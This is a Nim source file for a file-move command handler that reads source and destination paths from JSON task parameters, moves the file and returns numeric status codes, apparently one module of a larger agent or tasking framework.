# This is the source for the CAT command
import ../structs
import ../utils
import json
import os

#[
Moves a file from source to destination
  {"source": "srcpath", :"destination": "dstpath"}

]#
proc cmd_mv*(task: Task): seq[TaskResponse] {.cdecl.} =

  let params = parseJson(task.parameters)
  let
    source = params["source"].getStr()
    destination = params["destination"].getStr()

  # Configure Output
  var
    output = ""
    status = ""

  # 1) Check if the source even exists, if not: Abort
  if fileExists(source):

    let srcInfo = getFileInfo(source)

    # 2) Check if the source is a directory, if yes: Abort
    if srcInfo.kind == pcDir:
      status = "error"
      output = $cast[int](StatusCodes.SourceFileIsADir) #"Source File is a directory")
    else:
      # Its a file and destination must be checked

      # 3) Check if the destination exists, if not: copyFile
      if not fileExists(destination):
        try:
          DBG("Copy " & source & " To: " & destination)
          moveFile(source, destination)
          # 6) Done
          output = $cast[int](StatusCodes.FileMovedSuccessfully) #"Source file moved successfully to destination")
        except OSError:
          status = "error"
          output = $cast[int](StatusCodes.GenericError) #"An error occured moving the file. Error: " & $osLastError())
      else:
        status = "error"
        output = $cast[int](StatusCodes.DestinationExists) #"Destination file already exists"


  else: # File exists
    status = "error"
    output = $cast[int](StatusCodes.SourceFileNonexistent) #"Source File does not exist")


  # return the response
  return buildReturnData(task.id, output, status)
